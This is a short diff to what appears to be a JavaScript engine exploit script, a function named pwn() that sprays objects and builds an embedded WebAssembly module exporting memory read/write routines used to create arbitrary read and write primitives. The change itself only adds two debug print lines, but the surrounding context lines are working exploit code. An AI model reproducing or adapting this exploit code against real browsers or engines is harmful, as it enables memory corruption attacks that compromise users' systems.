@@ -159,7 +159,7 @@ function pwn() {
         a['prop' + i] = 1337;
         structs.push(a);
     }
-    
+    print("[+] ll");
     var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
     var webAssemblyBuffer = str2ab(webAssemblyCode);
     var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
@@ -255,7 +255,7 @@ function pwn() {
         writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
         writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
     }
-    
+    print("[+] ll1");
     // Create writer from Object
     function createObjWriter(obj) {
         wasmInternalMemory.memoryToRead = obj;
